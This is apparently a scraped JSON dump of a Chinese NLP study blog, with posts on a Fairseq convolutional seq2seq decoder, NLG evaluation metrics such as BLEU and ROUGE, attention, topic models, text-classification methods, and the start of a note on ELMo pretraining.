p=self.dropout, training=self.training) target_embedding = x # 将输入从词向量空间映射到CNN输入空间 x = self.fc1(x) # 转置：B x T x C -&gt; T x B x C x = self._transpose_if_training(x, incremental_state) # 多层的CNN 堆叠 avg_attn_scores = None num_attn_layers = len(self.attention) residuals = [x] for proj, conv, attention, res_layer in zip(self.projections, self.convolutions, self.attention, self.residuals): if res_layer &gt; 0: residual = residuals[-res_layer] residual = residual if proj is None else proj(residual) else: residual = None x = F.dropout(x, p=self.dropout, training=self.training) x = conv(x, incremental_state) x = F.glu(x, dim=2) # 注意力机制 if attention is not None: x = self._transpose_if_training(x, incremental_state) x, attn_scores = attention(x, target_embedding, (encoder_a, encoder_b), encoder_padding_mask) if not self.training and self.need_attn: attn_scores = attn_scores / num_attn_layers if avg_attn_scores is None: avg_attn_scores = attn_scores else: avg_attn_scores.add_(attn_scores) x = self._transpose_if_training(x, incremental_state) # 残差连接 if residual is not None: x = (x + residual) * math.sqrt(0.5) residuals.append(x) # 转置：T x B x C -&gt; B x T x C x = self._transpose_if_training(x, incremental_state) # fc2:将输入映射到词表大小空间，可进行预测 if self.fc2 is not None and self.fc3 is not None: x = self.fc2(x) x = F.dropout(x, p=self.dropout, training=self.training) x = self.fc3(x) return x, avg_attn_scores 123456789101112131415161718192021222324252627282930313233343536def main(args, init_distributed=False): ... # 载入数据 load_dataset_splits(task, ['train', 'valid']) # 构建模型及优化函数 model = task.build_model(args) criterion = task.build_criterion(args) # 构建训练器 trainer trainer = Trainer(args, task, model, criterion, dummy_batch, oom_batch) # 初始化dataloader epoch_itr = task.get_batch_iterator(...) # 训练一直到learning rate太小就停止 max_epoch = args.max_epoch or math.inf max_update = args.max_update or math.inf lr = trainer.get_lr() train_meter = StopwatchMeter() train_meter.start() while lr &gt; args.min_lr and epoch_itr.epoch &lt; max_epoch and trainer.get_num_updates() &lt; max_update: # 训练一个epoch train(args, trainer, task, epoch_itr) if epoch_itr.epoch % args.validate_interval == 0: valid_losses = validate(args, trainer, task, epoch_itr, valid_subsets) # 只用第一个validation loss去更新learning rate lr = trainer.lr_step(epoch_itr.epoch, valid_losses[0]) # 保存模型 if epoch_itr.epoch % args.save_interval == 0: save_checkpoint(args, trainer, epoch_itr, valid_losses[0]) train_meter.stop()","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"cnn","slug":"cnn","permalink":"https://racleray.github.io/tags/cnn/"},{"name":"Fairseq","slug":"Fairseq","permalink":"https://racleray.github.io/tags/Fairseq/"},{"name":"seq2seq","slug":"seq2seq","permalink":"https://racleray.github.io/tags/seq2seq/"}]},{"title":"NLG常用评价指标","slug":"NLG常用评价指标","date":"2020-07-07T06:30:48.000Z","updated":"2023-08-07T11:54:31.032Z","comments":true,"path":"posts/cd85a6be.html","link":"","permalink":"https://racleray.github.io/posts/cd85a6be.html","excerpt":"记录NLG的常用评估指标计算方法，包括BELU、ROUGE、METEOR等。","text":"NLG常用评价指标 客观评价指标 – BLEU – ROUGE – METEOR – CIDEr 主观评价指标 – 流畅度 – 相关性 – 助盲性 这些指标原先都是用来度量机器翻译结果质量的，并且被证明可以很好的反应待评测翻译结果的准确性，并且与人类对待评测翻译结果的评价存在强相关 BLEU 文献 只看中准确率的指标，就是说更加关心候选译文里的多少 n-gram 是对的（即在参考译文里出现了），而不在乎召回率（参考译文里有哪些 n-gram 在候选译文中没出现） 基于准确率，BLEU 得分越高越好 BLEU 是最早提出的机器翻译评价指标，是所有文本评价指标的源头。BLEU的全名为：bilingual evaluation understudy，即：双语互译质量评估辅助工具。 BLEU 的大意是比较候选译文和参考译文里的 n-gram（实践中从 unigram 取到 4-gram） 重合程度，重合程度越高就认为译文质量越高。选不同长度的 n-gram 是因为，unigram 的准确率可以用于衡量单词翻译的准确性，更高阶的 n-gram 的准确率可以用来衡量句子的流畅性。 BLEU 原论文建议大家的测试集里给每个句子配备 4 条参考译文，这样就可以减小语言多样性带来的影响（然而现在很多机器翻译的测试集都是只有 1 条译文，尴尬= =） brevity penalty 来惩罚候选译文过短的情况（候选译文过短在机器翻译中往往意味着漏翻，也就是低召回率） 现在还是普遍认为 BLEU 指标偏向于较短的翻译结果（brevity penalty 没有想象中那么强） 优点很明显：方便、快速、结果有参考价值 缺点也不少，主要有： 不考虑语言表达（语法）上的准确性； 测评精度会受常用词的干扰； 短译句的测评精度有时会较高； 没有考虑同义词或相似表达的情况，可能会导致合理翻译被否定； 1234567from nltk.translate.bleu_score import sentence_bleureference = [['this', 'is', 'a', 'test'], ['this', 'is' 'test']]candidate = ['this', 'is', 'a', 'test']score = sentence_bleu(reference, candidate)print(score) 只能做到个大概判断，它的目标也只是给出一个快且不差自动评估解决方案 image Hk(Ci) 表示Wk翻译选译文Ci中出现的次数， Hk(Sij) 表示Wk在标准答案Sij中出现的次数， maxi∈mhk(sij)表示某n-gram在多条标准答案中出现最多的次数， ∑i∑kmin(hk(ci),maxj∈mhk(sij))表示取n-gram在翻译译文和标准答案中出现的最小次数。 i为candidate的index；j为reference的index；k为n-gram的index image ROUGE 文献 ROUGE 和 BLEU 几乎一模一样，区别是 BLEU 计算准确率，而 ROUGE 计算召回率。 在 SMT（统计机器翻译）时代，机器翻译效果稀烂，需要同时评价翻译的准确度和流畅度；等到 NMT （神经网络机器翻译）出来以后，神经网络脑补能力极强，翻译出的结果都是通顺的，但是有时候容易瞎翻译，遗漏翻译 不看流畅度只看召回率（参考译文里的 n-gram 有多少出现在了候选译文中）就好了，这样就能知道 NMT 系统到底有没有漏翻（这会导致低召回率）。 所以，ROUGE 适合评价 NMT，而不适用于 SMT，因为它不管候选译文流不流畅。 image 分母是n-gram的个数，分子是参考摘要和自动摘要共有的n-gram的个数。ROUGE 得分越高越好 召回率是针对我们原来的样本而言的，它表示的是样本中的正例有多少被预测正确了。那也有两种可能，一种是把原来的正类预测成正类(TP)，另一种就是把原来的正类预测为负类(FN) 精确率是针对我们预测结果而言的，它表示的是预测为正的样本中有多少是对的。那么预测为正就有两种可能了，一种就是把正类预测为正类(TP)，另一种就是把负类预测为正类(FP) Rough-L: L即是LCS(longest common subsequence，最长公共子序列)的首字母，因为Rough-L使用了最长公共子序列。 METEOR 文献 METEOR 大意是说有时候翻译模型翻译的结果是对的，只是碰巧跟参考译文没对上（比如用了一个同义词），于是用 WordNet 等知识源扩充了一下同义词集，同时考虑了单词的词形（词干相同的词也认为是部分匹配的，也应该给予一定的奖励，比如说把 likes 翻译成了 like 在评价句子流畅性的时候，用了 chunk 的概念（候选译文和参考译文能够对齐的、空间排列上连续的单词形成一个 chunk，这个对齐算法是一个有点复杂的启发式 beam serach），chunk 的数目越少意味着每个 chunk 的平均长度越长，也就是说候选译文和参考译文的语序越一致 缺点： 有四个超参数 alpha, beta, gamma, delta，这些都是对着某个数据集调出来的（让算法的结果和人的主观评价尽可能一致，方法我记得是 grid search），参数一多听起来就不靠谱. 另外需要有外部知识源（WordNet 等）来进行单词对齐，所以对于 WordNet 中不包含的语言，就没法用 METEOR 来评价了。 使用 WordNet 计算特定的序列匹配，同义词，词根和词缀，释义之间的匹配关系，改善了BLEU的效果，使其跟人工判别共更强的相关性。 同时考虑了准确率和召回率，METEOR 得分越高越好 image CIDEr 文献 Consensus-based image description evaluation，通过度量待评测语句与其他大部分人工描述之间的相似性来评价。 这个指标的motivation之一是刚才提到的BLEU的一个缺点，就是对所有匹配上的词都同等对待，而实际上有些词应该更加重要。 CIDEr-D 是修改版本，为的是让 CIDEr 对于 gaming 问题更加鲁棒。什么是 Gaming 问题？它是一种现象，就是一个句子经过人工判断得分很低，但是在自动计算标准中却得分很高的情况。为了避免这种情况，CIDEr-D 增加了截断（clipping）和基于长度的高斯惩罚 CIDEr 是 BLEU 和向量空间模型的结合。它把每个句子看成文档，然后计算 TF-IDF 向量（只不过 term 是 n-gram 而不是单词）的余弦夹角，据此得到候选句子和参考句子的相似度，同样是不同长度的 n-gram 相似度取平均得到最终结果。优点是不同的 n-gram 随着 TF-IDF 的不同而有不同的权重，因为整个语料里更常见的 n-gram 包含了更小的信息量。 SPICE SPICE SPICE 是专门设计出来用于 image caption 问题的。全称是 Semantic Propositional Image Caption Evaluation。前面四个方法都是基于 n-gram 计算的，SPICE 则不是。 SPICE 使用基于图的语义表示来编码 caption 中的 objects, attributes 和 relationships。它先将待评价 caption 和参考 captions 用 Probabilistic Context-Free Grammar (PCFG) dependency parser parse 成 syntactic dependencies trees，然后用基于规则的方法把 dependency tree 映射成 scene graphs。最后计算待评价的 caption 中 objects, attributes 和 relationships 的 F-score 值。 image 翻译和图像描述的区别 在机器翻译中，译文应该忠实于原文，所以同一句话的多条译文应该互为转述，包含同样的信息；而同一幅图的多条字幕则不一定互为转述，因为不同的字幕可以包含不同数量的图像细节，不管描述得比较详细还是比较粗糙都是正确的字幕。 简单总结 NLG常用metrics： BLEU: ngram precision；长度类似 ROUGE: ngram recall NIST/CIDEr: 降低频繁词的权重 METEOR: 考虑同义词的F score；鼓励连续词匹配 SPICE：匹配语法树与图像特征的F1 其他： STM: 匹配语法树子树 TER: 编辑的距离 TERp: TER+同义替换 常用评测指标的开源实现 MS COCO Caption Evaluation COCO demo","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"bleu","slug":"bleu","permalink":"https://racleray.github.io/tags/bleu/"},{"name":"rouge","slug":"rouge","permalink":"https://racleray.github.io/tags/rouge/"},{"name":"evaluation","slug":"evaluation","permalink":"https://racleray.github.io/tags/evaluation/"}]},{"title":"seq2seq","slug":"seq2seq","date":"2020-07-07T05:34:02.000Z","updated":"2023-08-07T11:54:31.038Z","comments":true,"path":"posts/ef7a7a35.html","link":"","permalink":"https://racleray.github.io/posts/ef7a7a35.html","excerpt":"Sequence-to-sequence (seq2seq) 模型，突破了传统的检索式框架，从一种端到端的角度出发解决问题，将经典深度神经网络模型运用于翻译与职能问答这一类序列型任务。","text":"seq2seq 1.seq2seq（序列到序列模型）简介 ​ 对于很多自然语言处理任务，比如聊天机器人，机器翻译，自动文摘，智能问答等，传统的解决方案都是检索式，这对素材的完善程度要求很高，随着深度学习的发展，研究界将深度学习技术应用与自然语言的生成和自然语言的理解的方面的研究，并取得了一些突破性的成果，比如，Sequence-to-sequence (seq2seq) 模型，该技术突破了传统的固定大小输入问题框架，将经典深度神经网络模型运用于翻译与职能问答这一类序列型任务，并在各主流语言之间的相互翻译以及语音助手中人机短问答的应用。 参考资料:Visualizing A Neural Machine Translation Model 2.编码解码模型 ​ seq2seq模型不仅仅是用在NLP中的模型，它的输入也可以是语音信号或者图像表示。 ​ 在NLP的任务中，其实输入的是文本序列，输出的很多时候也是文本序列。 ​ 这是一个“编码解码器”结构，编码器处理输入序列中的每个元素(在这里可能是1个词)，将捕获的信息编译成向量（称为上下文内容向量）。在处理整个输入序列之后，编码器将上下文发送到解码器，解码器逐项开始产生输出序列。 ​ 在机器翻译的场景下，是下面这样的。 ​ 上下文向量其实就是 ​ 输入的数据(文本序列)中的每个元素(词)被编码成一个稠密的向量word embedding ​ encoder和decoder一般为循环神经网络(RNN)，循环神经网络会接受每个位置(时间点)上的输入，同时经过处理进行信息融合，并可能会在某些位置(时间点)上输出。 ​ 所以动态地展示整个编码器和解码器。 ​ 在更多的时候，为提升效果，会采用一个叫做注意力模型的模型来动态处理和解码 ​ 所谓的注意力机制，可以粗略地理解为是一种对于输入的信息，根据重要程度进行不同权重的加权处理(通常加权的权重来源于softmax后的结果)的机制，如下图所示，是一个在解码阶段，简单地对编码器中的hidden states进行不同权重的加权处理的过程。 更详细一点的注意力解码过程如下图所示。 带注意力的解码器RNN接收的嵌入(embedding)和一个初始的解码器隐藏状态(hidden state)。 RNN处理输入，产生新的隐藏状态向量（h4）。 attention的步骤：使用编码器隐藏状态(hidden state)和h4向量来计算该时间步长的上下文向量（C4）。 把h4和C4拼接成一个向量。 把拼接后的向量连接全连接层和softmax完成解码 每个时间点上重复这个操作 也可以把这个动态解码的过程展示成下述图所示的过程。 注意力机制可以学习源语言和目标语言之间词和词对齐关系的方式。 3.Attention ​ seq2seq 是一个Encoder–Decoder 结构的网络，它的输入是一个序列，输出也是一个序列， Encoder 中将一个可变长度的信号序列变为固定长度的向量表达，Decoder 将这个固定长度的向量变成可变长度的目标的信号序列。 输入： \\(x = (x_1,...,x_{T_x})\\) 输出： \\(y = (y_1,...,y_{T_y})\\) \\(h_t = RNN_{enc}(x_t, h_{t-1})\\) , Encoder方面接受的是每一个单词word embedding，和上一个时间点的hidden state。输出的是这个时间点的hidden state。 \\(s_t = RNN_{dec}(\\hat{y_{t-1}},s_{t-1})\\) ， Decoder方面接受的是目标句子里单词的word embedding，和上一个时间点的hidden state。 \\(c_i = \\sum_{j=1}^{T_x} \\alpha_{ij}h_j\\) , context vector是一个对于encoder输出的hidden states的一个加权平均。 \\(\\alpha_{ij} = \\frac{exp(e_{ij})}{\\sum_{k=1}^{T_x}exp(e_{ik})}\\) , 每一个encoder的hidden states对应的权重。 \\(e_{ij} = score(s_i, h_j)\\) , 通过decoder的hidden states加上encoder的hidden states来计算一个分数，用于计算权重(4) \\(\\hat{s_t} = tanh(W_c[c_t;s_t])\\), 将context vector 和 decoder的hidden states 串起来。 \\(p(y_t|y_{&lt;t},x) = softmax(W_s\\hat{s_t})\\) ，计算最后的输出概率。 ​ ​ 其中Encoder的hidden state不一定要作为Decoder的hidden state输入，可以将Decoder的hidden state仅仅做常规初始化。 score ​ 一般有三种score的计算方法 第1种 输入是encoder的所有hidden states H: 大小为(hid dim, sequence length)。decoder在一个时间点上的hidden state， s： 大小为（hid dim, 1）。 第一步：旋转H为（sequence length, hid dim) 与s做点乘得到一个 大小为(sequence length, 1)的分数。 第二步：对分数做softmax得到一个合为1的权重。 第三步：将H与第二步得到的权重做点乘得到一个大小为(hid dim, 1)的context vector。 第2种 输入是encoder的所有hidden states H: 大小为(hid dim1, sequence length)。decoder在一个时间点上的hidden state， s： 大小为（hid dim2, 1）。此处两个hidden state的纬度并不一样。 第一步：旋转H为（sequence length, hid dim1) 与 Wa [大小为 hid dim1, hid dim 2)] 做点乘， 再和s做点乘得到一个 大小为(sequence length, 1)的分数。 第二步：对分数做softmax得到一个合为1的权重。 第三步：将H与第二步得到的权重做点乘得到一个大小为(hid dim, 1)的context vector。 NMT官方Git：https://github.com/tensorflow/nmt NMT官方Git翻译版本：HTML tensorflow attention wrapper实现机制 ref : https://tangshusen.me/2019/03/09/tf-attention/ AttentionWrapper实现相对于理解理论更复杂一些。 ​ 简而言之，增加了attention layer，将attention算法中得到的context vector与decoder当前输出cell_outputs(即hidden state)通过计算得到一个attention向量。当attention layer没有指定时，attention向量直接取context vector(即，算法理论中的计算方式)。 ​ 增加了cell_input_fn，将上一步的attention向量与当前步的inputs，联合成新的cell_inputs。 ​ attention mechanism：输入decoder的cell_outputs(即hidden state)，与memory(encoder的hidden state)计算alignments(权重) Code Demo 对联生成 -- dir 诗歌生成 -- dir","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"seq2seq","slug":"seq2seq","permalink":"https://racleray.github.io/tags/seq2seq/"},{"name":"attention","slug":"attention","permalink":"https://racleray.github.io/tags/attention/"}]},{"title":"主题模型","slug":"主题模型","date":"2020-07-07T05:24:13.000Z","updated":"2023-08-07T11:54:31.039Z","comments":true,"path":"posts/4ede4335.html","link":"","permalink":"https://racleray.github.io/posts/4ede4335.html","excerpt":"此处只记录了问题定义，移步《统计学习方法》第二版15-20章内容进行查阅。","text":"详见《统计学习方法》第二版，15-20章 ​ 主题模型在《统计学习方法》第二版，15-20章有较为详细的介绍。 pLSA ​ 包含“隐含变量”或者“缺失数据”的概率模型参数估计问题可以采用EM算法。 ​ EM算法的步骤本质上是一种交替最优化（二部坐标下降法）： E步骤：求隐含变量Given当前估计的参数条件下的后验概率。 M步骤：最大化Complete data对数似然函数的期望，此时我们使用E步骤里计算的隐含变量的后验概率，得到新的参数值。 EM算法求解PLSA 已知量：w,d 隐变量：z 参数：P(w|z)，P(z|d) E:直接写出 M:拉格朗日乘子法求解 LDA EM算法求解LDA 已知量：w 隐变量：z，θ，φ 参数：a，β E:直接写不出，需要用变分法近似，或者吉布斯采样 M:坐标下降法求解，可以考虑牛顿法 详见李航《统计学习方法》第二版，15-20章","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"lda","slug":"lda","permalink":"https://racleray.github.io/tags/lda/"}]},{"title":"文本分类advanced","slug":"文本分类advanced","date":"2020-07-06T16:48:46.000Z","updated":"2023-08-07T11:54:31.043Z","comments":true,"path":"posts/e6e273ef.html","link":"","permalink":"https://racleray.github.io/posts/e6e273ef.html","excerpt":"做细粒度文本分类任务时的一点记录。","text":"细粒度分类 多标签问题，每一个类别标签训练一个分类器，忽略了不同类别标签间的联系。 多任务学习，特征提取阶段共享参数，最后几层单独输出。优点是考虑了不同任务间的联系，有联系的类别标签可以一块训练，对不均衡的样本数据有增强作用。 Seq2Seq，把多标签的预测问题看成了一个序列到序列的学习，这样既考虑了标签之间的联系，又可以处理大量标签的问题。 Aspect Based，当有每种Aspect（可理解为主题）相关信息，且每个样本属于特定的Aspect。需要根据属于识别Aspect和分类。 数据处理 可选项有 明显噪声处理，例如全篇标点符号，繁体转简体等。 分词器选择与自定义词典扩充。使用word2vec初始化时，训练词向量的词表和模型使用的词表一致（分词器不要混用）。 分词与分字特征可分别利用，训练不同模型集成。 word2vec 与 bert类模型提取的特征，拼接，输入下游任务设计。 EDA：同义词替换，随机删除、交换位置等。翻译效果不稳定。 不平衡数据： 上采样：罕见类数据随机打乱作为扩充。同义词替换，随机删除、交换位置等扩充。使用扩充数据时，不要连续使用增强后的数据，可以相隔一两个epoch使用。 下采样，数据利用率不高。 标签权重加入loss计算。实际效果是，不一定带来提高，尤其是复杂的分类任务，但可选。 Label smoothing。约束神经网络本身对错误标签的极大惩罚（loss在bp时，回传一般是label与predict之差）。提高泛化力。 focal loss。损失计算偏向于没有正确分类的输出修正（理论上）。 使用预训练特征提取器时（EMLo，BERT类）： 使用外部相似预料进行模型pretrain。 长度有限制的模型，可以尝试随机删除句子。（观测数据，如果开头和结尾重要，就删中间部分） 模型 Bi-GRU + Multi Capsule Bi-GRU + Multi ResNet HAN + Attention Transformer Encoder + Convolutional Seq2Seq 解码器三种思路： 使用LSTM（或其他）每一步（#不同种类标签数）的output表示不同种类标签的预测输出 Beam Search尽量好的输出预测序列（只是在inference阶段使用）。 Global Embedding（在训练阶段使用），类似Beam Search： image y为预测标签分布（output softmax后的输出），e为每一步（#每一种标签）的output；g为global embedding的输出，代替LSTM的hidden state，进行序列解码任务。 【SGM: Sequence Generation Model for Multi-Label Classification】 Aspect Based Sentiment Analysis 抽取content特征，Aspect信息，使用各种方法attention到和输出label相关的信息。比如： image 【Capsule Network with Interactive Attention for Aspect-Level Sentiment Classification】 另一种思路，树形（层级搜索）： image 上图中加入aspect信息到输入层 模型训练 Warm up：学习率先增加，然后减小。线性增加即可。也可以使用one cycle fitting，让学习率在一个epoch内，线性增加到一个较大值，然后线性减小为初始的较小学习率。绘制loss--lr曲线图，摘到loss的变化较大处的lr的十分之一。【A DISCIPLINED APPROACH TO NEURAL NETWORK HYPER-PARAMETERS: PART 1 – LEARNING RATE, BATCH SIZE, MOMENTUM, AND WEIGHT DECAY】 找到合适学习率后（实验）， 将模型迭代足够多次（loss可能在一段时间不降之后，突然下降），保留验证正确率最高的模型。加载上一个最优模型，学习率设为当前1/10（实验），继续训练模型，保留验证正确率最高的模型。加载上一个最优模型，去掉正则化策略(dropout 等，如果有)，学习率再降低，训练到收敛。 先调整学习率，再调整其他模型超参数。 sequence模型，序列长度要选取合适。不损失太多信息。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"fine-grained","slug":"fine-grained","permalink":"https://racleray.github.io/tags/fine-grained/"},{"name":"classification","slug":"classification","permalink":"https://racleray.github.io/tags/classification/"}]},{"title":"文本分类深度学习方法","slug":"文本分类深度学习方法","date":"2020-07-06T16:34:54.000Z","updated":"2023-08-07T11:54:31.044Z","comments":true,"path":"posts/bc7ffed8.html","link":"","permalink":"https://racleray.github.io/posts/bc7ffed8.html","excerpt":"整理CNN、RNN、fastText等模型在文本分类中的应用。","text":"fastText ​ 官方Git ​ fastText是Facebook AI Research在16年开源的一个文本分类器。 其特点就是fast。相对于其它文本分类模型，如SVM，Logistic Regression和neural network等模型，fastText在保持分类效果的同时，大大缩短了训练时间。 适合大型数据+高效的训练速度：在使用标准多核CPU的情况下10分钟内处理超过10亿个词 支持多语言表达：利用其语言形态结构，fastText能够被设计用来支持包括英语、德语、西班牙语、法语以及捷克语等多种语言。 fastText专注于文本分类，在许多标准问题上有较好的表现（例如文本倾向性分析或标签预测）。 ​ fastText 模型输入一个词的序列（一段文本或者一句话)，输出这个词序列属于不同类别的概率。 ​ 序列中的词和词组组成特征向量，特征向量通过线性变换映射到中间层，中间层再映射到标签。 fastText 在预测标签时使用了非线性激活函数，但在中间层不使用非线性激活函数。 ​ fastText 模型架构和 Word2Vec 中的 CBOW 模型很类似。不同之处在于，fastText 预测标签，而 CBOW 模型预测中间词。 ​ 基本框架： 字符n-gram ​ 将输入序列（一整句话，而不是CBOW的窗口输入），进行字符n-gram。n-gram一定程度上克服了CBOW这类bag of words模型无视了语序的缺点。 ​ 罕见词仍然可以被分解成字符n-gram。 123apple &gt;&gt;&gt; “&lt;ap”, “app”, “ppl”, “ple”, “le&gt;” &lt;表示前缀，&gt;表示后缀 ​ 隐藏表征在不同类别所有分类器中进行共享，使得文本信息在不同类别中能够共同使用。 层次 Softmax 分类 ​ 基本思想是使用树的层级结构替代扁平化的标准Softmax，使得在计算 P(y=j) 时，只需计算一条路径上的所有节点的概率值，无需在意其它的节点。 ​ 层次 Softmax的原理在文本表示笔记部分，在word2vec的优化部分进行了说明。 ​ 一般情况下，使用fastText进行文本分类的同时也会产生词的embedding，即embedding是fastText分类的产物。 ​ 用单词的embedding叠加获得的文档向量，词向量的重要特点就是向量的距离可以用来衡量单词间的语义相似程度，于是，在fastText模型中，这两段同类文本的向量应该是相似的。 CNN ​ 卷积神经网络经常用来处理具有类似网格拓扑结构（grid-like topology）的数据。 ​ 应用于文本处理很简单。 RNN \\[ h_t=f(x_t,h_{t-1})=\\sigma(W_{xh}x_t+W_{hh}h_{t-1}+b_h) \\] ​ 其中\\(W_{xh}\\)是输入到隐层的矩阵参数，\\(W_{hh}\\)是隐层到隐层的矩阵参数，\\(b_h\\)为隐层的偏置向量（bias）参数，\\(\\sigma\\)为\\(sigmoid\\)函数。 ​ 一般提取最后一个时刻的隐层状态作为句子表示进而使用分类模型。 LSTM ​ LSTM增加了记忆单元𝑐、输入门𝑖、遗忘门𝑓及输出门𝑜。这些门及记忆单元组合起来大大提升了循环神经网络处理长序列数据的能力。 \\(i_t = \\sigma{(W_{xi}x_t+W_{hi}h_{t-1}+b_i)}\\) $ f_t = (W_{xf}x_t+W_{hf}h_{t-1}+b_f) $ $ c_t = f_t c_{t-1}+i_t tanh(W_{xc}x_t+W_{hc}h_{t-1}+b_c) $ $o_t = (W_{xo}x_t+W_{ho}h_{t-1}+b_o) $ $ h_t = o_t tanh(c_t) $ ​ 其中，\\(i_t, f_t, c_t, o_t\\)分别表示输入门，遗忘门，记忆单元及输出门的向量值，带角标的\\(W\\)及\\(b\\)为模型参数，\\(tanh\\)为双曲正切函数，\\(\\odot\\)表示逐元素（elementwise）的乘法操作。 ​ 输入门控制着新输入进入记忆单元\\(c\\)的强度，遗忘门控制着记忆单元维持上一时刻值的强度，输出门控制着输出记忆单元的强度。 ​ 三种门的计算方式类似，但有着完全不同的参数，它们各自以不同的方式控制着记忆单元\\(c\\)： Forget Gate： Input Gate： 更新Cell state： Output Gate： ​ 图中带有方块的线，没有在计算中直接公式求解，s即cell state，通过hidden state的计算，从而进行信息传递。详细内容查找神经网络笔记。 ​ GRU 将忘记门和输入门合并成为一个单一的更新门 同时合并了数据单元状态和隐藏状态 结构比LSTM的结构更加简单 RCNN ​ ​ 卷积层建立在一个BiRNN模型之上，通过正向和反向循环来构造一个单词的下文和上文，然后输入CNN，如下式： ​ 得到单词的上下文表示之后，用拼接的方式来表示这个单词. ​ 然后通过max pooling层和全连接层，得到最后的输出。这一部分相当于文本表示的学习。 ​ 将该词向量放入一个单层神经网络中，得到所谓的潜语义向量（latent semantic vector），这里卷积层的计算结束了，时间复杂度仍是O(n)。接下来进行池化层，这里采用max-pooling可以将向量中最大的特征提取出来，从而获取到整个文本的信息。池化过程时间复杂度也是O(n)，所以整个模型的时间复杂度是O(n)。得到文本特征向量之后，进行分类。 Quasi-RNN ​ 框图显示了QRNN的计算结构与典型值的比较LSTM和CNN架构。 红色表示卷积或矩阵乘法； 连续的块意味着这些计算可以并行进行。 蓝色表示无参数功能沿通道/特征维度并行运行的对象。 LSTM可以分解为（红色）线性块和（蓝色）element-wise部分，但每个时间步的计算仍取决于上一个时间步的结果。 ​ fo-Pool指的是以下公式，包括forget 和 output 的h计算方式 而上图中 ​","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"fastText","slug":"fastText","permalink":"https://racleray.github.io/tags/fastText/"},{"name":"CNN","slug":"CNN","permalink":"https://racleray.github.io/tags/CNN/"},{"name":"RNN","slug":"RNN","permalink":"https://racleray.github.io/tags/RNN/"}]},{"title":"文本分类传统机器学习方法","slug":"文本分类传统机器学习方法","date":"2020-07-06T16:25:53.000Z","updated":"2023-08-07T11:54:31.043Z","comments":true,"path":"posts/f4b85348.html","link":"","permalink":"https://racleray.github.io/posts/f4b85348.html","excerpt":"简要记录了朴素贝叶斯、逻辑回归、SVM等机器学习分类模型。","text":"朴素贝叶斯模型与中文文本分类 \\[ P(Y|X)=\\frac{P(X|Y)P(Y)}{P(X)} \\] \\[ P(Y,X) = P(Y|X)P(X)=P(X|Y)P(Y) \\] ​ 条件独立假设的一个缺陷是，失去了词语之间的顺序信息。这就相当于把所有的词汇扔进到一个袋子里随便搅和，贝叶斯都认为它们一样。因此这种情况也称作词袋模型(bag of words)。 优化 取对数 转换为权重，每个词一个重要度，而不是计数 选取top k关键词 分割样本，根据文本长度选择不同数量的关键词数量，文本长时选取多一些 位置权重：比如在标题中的关键词，权重大一些 Logistic Regression ​ Logistic 回归并非最强大的分类算法，它可以很容易地被更为复杂的算法所超越，另一个缺点是它高度依赖正确的数据表示。但是其计算效率是相对较高的。不能用 logistic 回归来解决非线性分类问题，因为它的决策边界是线性的。 SVM ​ 找到具有最小间隔的样本点，然后拟合出一个到这些样本点距离和最大的线段/平面。 ​ 目标函数： image ​ 优化问题可推导出：【过程见机器学习笔记】 image ​ 得到回归系数： image 实验 notebook","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"classification","slug":"classification","permalink":"https://racleray.github.io/tags/classification/"},{"name":"machine learning","slug":"machine-learning","permalink":"https://racleray.github.io/tags/machine-learning/"}]},{"title":"文本表示进阶","slug":"文本表示进阶","date":"2020-07-06T15:29:30.000Z","updated":"2023-08-07T11:54:31.046Z","comments":true,"path":"posts/ec2b8b1f.html","link":"","permalink":"https://racleray.github.io/posts/ec2b8b1f.html","excerpt":"记录预训练语言模型的一些总结，包括从ELMo到BERT再到XLNet的小结。没有细化，有点冗长。","text":"文本表示进阶 image ​ 预训练过程是做图像或者视频领域的一种比较常规的做法，这种做法很有效，能明显促进应用的效果。 ​ 两种做法，一种是浅层加载的参数在训练C任务过程中不动，这种方法被称为“Frozen”;另外一种是底层网络参数尽管被初始化了，在C任务训练过程中仍然随着训练的进程不断改变，这种一般叫“Fine-Tuning”。 image ​ 用ImageNet来做网络的预训练，主要有两点，一方面ImageNet是图像领域里有很多事先标注好训练数据的数据集合，是个很大的优势，量越大训练出的参数越靠谱；另外一方面因为ImageNet有1000类，类别多，所以通用性好。 ​ NLP相对图像的特点在于，词作为NLP的基本要素，比像素的抽象程度更高，已经加入了人类数万年进化而来的抽象经验。 ​ 预训练语言模型的优势在于： 近乎无限量的优质数据 无需人工标注 一次学习多次复用 学习到的表征可在多个任务中进行快速迁移 ​ word2vec的问题：Word Embedding本质上是个静态的。不论新句子上下文单词是什么，这个单词的Word Embedding不会跟着上下文场景的变化而改变。这就是问题所在，多义性的消失。 ELMo：Embedding from Language Models ​ ELMo采用了典型的两阶段过程， 第一个阶段是利用语言模型进行预训练； 第二个阶段是在做下游任务时，从预训练网络中提取对应单词的网络各层的Word Embedding作为新特征补充到下游任务中。 image 结构 ​ ELMo 为了利用无标记数据，使用了语言模型： ​ 基本框架是一个双层的 Bi-LSTM，不过在第一层和第二层之间加入了一个残差结构（一般来说，残差结构能让训练过程更稳定）。做预训练的时候，ELMo 的训练目标函数为: \\[ \\sum_{k=1}^{N} \\log p\\left(t_{k} | t_{1}, \\ldots, 